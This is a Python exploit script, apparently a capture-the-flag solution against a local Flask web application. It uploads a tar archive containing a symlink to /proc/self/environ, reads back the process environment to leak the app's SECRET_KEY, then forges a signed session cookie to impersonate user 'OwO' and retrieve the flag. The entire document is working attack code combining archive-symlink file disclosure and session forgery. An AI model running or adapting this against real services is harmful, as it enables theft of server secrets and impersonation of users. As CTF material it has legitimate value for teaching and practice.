from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import requests
import random
import string
import tarfile
import io

TARGET_URL = 'http://localhost:25021'

# Create a user
username = ''.join(random.choices(string.ascii_letters, k=8))
password = 'asdfasdf'
credentials = {
    'username': username,
    'password': password,
}
res = requests.post(TARGET_URL + '/api/register', json=credentials)
assert(res.ok)

# Login
res = requests.post(TARGET_URL + '/api/login', json=credentials)
assert(res.ok)
cookies = res.cookies

payload = io.BytesIO()
# Prepare a tar file with a symlink to /proc/self/environ
with tarfile.open(mode='w', fileobj=payload) as tar:
    lnk = tarfile.TarInfo()
    lnk.name = 'environ'
    lnk.linkname = '/proc/self/environ'
    lnk.type = tarfile.SYMTYPE
    tar.addfile(lnk)

captcha_id = input("captcha_id: ")
print("Open this URL in browser and solve the CAPTCHA: (The faint letter behind OwO)")
print(f'URL: {TARGET_URL}/api/captcha?name={captcha_id}&length=1')
captcha_solution = input("captcha_solution: ")
res = requests.post(TARGET_URL + '/api/upload', data={'captcha_id': captcha_id, 'captcha_solution': captcha_solution},
                    cookies=cookies, files={'file': payload.getvalue()})
if not res.ok:
    print(f'{res.status_code} {res.text}')
    exit(1)

upload_id = res.text.strip()
print(f'Upload ID: {upload_id}')
# Leak the secret key
res = requests.get(TARGET_URL + f'/uploads/{upload_id}/environ', cookies=cookies)
assert(res.ok)
secret_key = next(filter(lambda x: 'SECRET_KEY=' in x, res.text.split('\0'))).replace('SECRET_KEY=', '')
print(f"Got secret key: {secret_key}")

# Forge the session token ourselves
app = Flask("hecker")
app.secret_key = secret_key
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
assert(serializer)
forged_cookie_val = serializer.dumps({'user': 'OwO'})

# Finally, get the flag
res = requests.get(TARGET_URL + '/api/flag', cookies={'session': forged_cookie_val})
print(f'{res.status_code} {res.text}')
